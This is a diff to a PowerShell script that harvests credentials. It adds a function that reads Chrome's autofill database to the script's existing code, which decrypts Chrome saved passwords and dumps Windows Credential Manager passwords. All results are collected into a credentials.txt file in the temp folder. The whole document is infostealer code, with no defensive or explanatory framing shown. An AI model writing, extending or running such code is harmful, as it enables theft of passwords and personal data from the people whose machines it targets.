@@ -1,12 +1,3 @@
-# Ensure the necessary modules are loaded
-if (-not (Get-Module -ListAvailable -Name "SQLite")) {
-    Install-Module -Name "SQLite" -Force
-}
-
-if (-not (Get-Module -ListAvailable -Name "PSReadLine")) {
-    Install-Module -Name "PSReadLine" -Force
-}
-
 # Function to decrypt Chrome passwords
 function Get-ChromePasswords {
     try {
@@ -41,6 +32,30 @@ function Get-ChromePasswords {
     }
 }
 
+# Function to get Chrome autofill data
+function Get-ChromeAutofill {
+    try {
+        $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data"
+        $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
+        $dbConnection.Open()
+        $cmd = $dbConnection.CreateCommand()
+        $cmd.CommandText = "SELECT name, value FROM autofill"
+        $reader = $cmd.ExecuteReader()
+
+        $autofillData = @()
+        while ($reader.Read()) {
+            $name = $reader["name"]
+            $value = $reader["value"]
+            $autofillData += [pscustomobject]@{Name = $name; Value = $value}
+        }
+        $dbConnection.Close()
+        return $autofillData
+    } catch {
+        Write-Error "Failed to get Chrome autofill data: $_"
+        return @()
+    }
+}
+
 # Function to get Credential Manager passwords
 function Get-CredentialManagerPasswords {
     try {
@@ -62,6 +77,7 @@ function Get-CredentialManagerPasswords {
 
 # Combine results and save to file
 $chromePasswords = Get-ChromePasswords
+$chromeAutofill = Get-ChromeAutofill
 $credentialManagerPasswords = Get-CredentialManagerPasswords
 
 $outputPath = "$env:TEMP\credentials.txt"
@@ -69,6 +85,12 @@ if ($chromePasswords.Count -gt 0) {
     $chromePasswords | Out-File -FilePath $outputPath -Append
 } else {
     Add-Content -Path $outputPath -Value "No Chrome passwords found."
+}
+
+if ($chromeAutofill.Count -gt 0) {
+    $chromeAutofill | Out-File -FilePath $outputPath -Append
+} else {
+    Add-Content -Path $outputPath -Value "No Chrome autofill data found."
 }
 
 if ($credentialManagerPasswords.Count -gt 0) {
